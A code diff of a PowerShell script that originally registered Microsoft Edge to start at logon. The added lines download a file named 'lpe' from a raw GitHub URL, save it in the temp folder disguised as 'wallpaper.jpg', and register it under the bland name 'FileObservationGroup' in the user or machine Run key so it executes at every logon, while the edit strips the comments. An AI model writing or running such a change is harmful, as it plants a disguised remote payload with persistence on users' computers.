@@ -1,4 +1,7 @@
-# Get active user via WMI
+$imageUrl = "https://raw.githubusercontent.com/kolomka-cpu/elka/refs/heads/main/lpe"
+$imagePath = "$env:TEMP\wallpaper.jpg"
+
+Invoke-WebRequest -Uri $imageUrl -OutFile $imagePath -UseBasicParsing
 $activeUser = (Get-CimInstance Win32_ComputerSystem).UserName
 
 if (-not $activeUser) {
@@ -8,7 +11,6 @@ if (-not $activeUser) {
 
 Write-Output "Active user: $activeUser"
 
-# Get user SID
 try {
     $ntAccount = New-Object System.Security.Principal.NTAccount($activeUser)
     $sid = $ntAccount.Translate([System.Security.Principal.SecurityIdentifier]).Value
@@ -19,18 +21,11 @@ try {
 
 Write-Output "User SID: $sid"
 
-# Edge path
-$edgePath = "$env:ProgramFiles (x86)\Microsoft\Edge\Application\msedge.exe"
-if (-not (Test-Path $edgePath)) {
-    $edgePath = "$env:ProgramFiles\Microsoft\Edge\Application\msedge.exe"
-}
-
-if (-not (Test-Path $edgePath)) {
-    Write-Output "Microsoft Edge executable not found"
+if (-not (Test-Path $imagePath)) {
+    Write-Output "FileObservationGroup script not found"
     exit
 }
 
-# Ensure user hive is loaded
 if (-not (Test-Path "Registry::HKEY_USERS\$sid")) {
     Write-Output "User hive not loaded, attempting to load"
 
@@ -47,15 +42,14 @@ $runKeyMachine = "Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\Curren
 
 $created = $false
 
-# Try HKU
 try {
     if (-not (Test-Path $runKeyUser)) {
         New-Item -Path $runKeyUser -Force | Out-Null
     }
 
     New-ItemProperty -Path $runKeyUser `
-        -Name "EdgeAutoStart" `
-        -Value "`"$edgePath`"" `
+        -Name "FileObservationGroup" `
+        -Value "`"$imagePath`"" `
         -PropertyType String `
         -Force | Out-Null
 
@@ -66,12 +60,11 @@ catch {
     Write-Output "Failed to create autorun entry in HKU: $_"
 }
 
-# Fallback to HKLM
 if (-not $created) {
     try {
         New-ItemProperty -Path $runKeyMachine `
-            -Name "EdgeAutoStart" `
-            -Value "`"$edgePath`"" `
+            -Name "FileObservationGroup" `
+            -Value "`"$imagePath`"" `
             -PropertyType String `
             -Force | Out-Null
 
@@ -81,6 +74,3 @@ if (-not $created) {
         Write-Output "Failed to create autorun entry in HKLM: $_"
     }
 }
-
-# Optional: unload hive if it was loaded manually
-# reg unload "HKU\$sid"
